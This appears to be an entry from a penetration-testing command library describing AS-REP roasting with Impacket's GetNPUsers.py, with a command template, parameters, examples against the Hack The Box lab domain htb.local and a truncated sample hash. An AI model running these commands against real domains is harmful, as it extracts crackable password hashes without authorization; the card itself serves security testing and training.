---
id: 59b66d80-8955-4783-8e7c-3c3e760d2f62
name: getnpusers-no-pass-single-user
type: command
executor: bash
data: >-
  python GetNPUsers.py $_DOMAIN/$_TARGET_USER -no-pass -format hashcat
  -outputfile $_OUTPUT_FILE
output: >-
  $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
created_at: '2023-04-06T03:56:04.983374+00:00'
updated_at: '2023-04-10T20:26:39.227036+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - impacket
verified: true
validated: true
---

# getnpusers-no-pass-single-user

## Command

```bash
python GetNPUsers.py $_DOMAIN/$_TARGET_USER -no-pass -format hashcat -outputfile $_OUTPUT_FILE
```

## Description

Extracts the AS-REP hash for a single user without providing a password, using Impacket to request a TGT from the KDC.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain (e.g., htb.local) | Yes |
| $_TARGET_USER | Username to roast (e.g., svc-alfresco) | Yes |
| -no-pass | Skip password authentication | Yes |
| -format hashcat | Output in hashcat-compatible format | Yes |
| -outputfile $_OUTPUT_FILE | Save to file (e.g., hashes.asreproast) | No |

## Examples

### Basic Usage

```bash
python GetNPUsers.py htb.local/svc-alfresco -no-pass
```

### With Output File

```bash
python GetNPUsers.py htb.local/svc-alfresco -no-pass -format hashcat -outputfile hashes.asreproast
```

## Expected Output

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4

## Related

- [[procedures/Kerberos-AS-REP-Roasting-Attack]]
- [[tools/Impacket]]
